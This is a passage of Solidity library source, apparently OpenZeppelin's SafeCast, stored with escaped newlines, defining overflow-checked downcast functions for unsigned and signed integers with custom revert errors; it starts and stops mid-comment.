by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a 